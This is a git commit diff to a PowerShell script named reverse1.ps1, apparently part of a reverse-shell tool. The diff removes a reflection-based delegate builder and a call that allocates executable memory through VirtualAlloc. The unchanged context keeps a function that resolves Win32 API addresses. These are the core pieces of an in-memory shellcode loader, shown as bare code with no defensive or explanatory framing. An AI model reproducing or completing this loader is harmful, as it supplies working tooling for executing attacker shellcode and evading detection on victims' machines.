ba71d254769b1350905367607edf814e28492a09
vikypatni <34309630+vikypatni@users.noreply.github.com>
2025-01-20 17:32:44 +0530

    Update reverse1.ps1

--- reverse1.ps1
+++ reverse1.ps1
@@ -8,26 +8,3 @@ function LookupFunc {
     return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
     @($moduleName)), $functionName))
 }
-
-function getDelegateType {
-    Param (
-        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
-        [Parameter(Position = 1)] [Type] $delType = [Void]
-    )
-    $type = [AppDomain]::CurrentDomain.
-    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
-    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
-    DefineDynamicModule('InMemoryModule', $false).
-    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
-    [System.MulticastDelegate])
-    $type.
-    DefineConstructor('RTSpecialName, HideBySig, Public',
-    [System.Reflection.CallingConventions]::Standard, $func).
-    SetImplementationFlags('Runtime, Managed')
-    $type.
-    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
-    SetImplementationFlags('Runtime, Managed')
-    return $type.CreateType()
-}
-
-$lpMem =[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
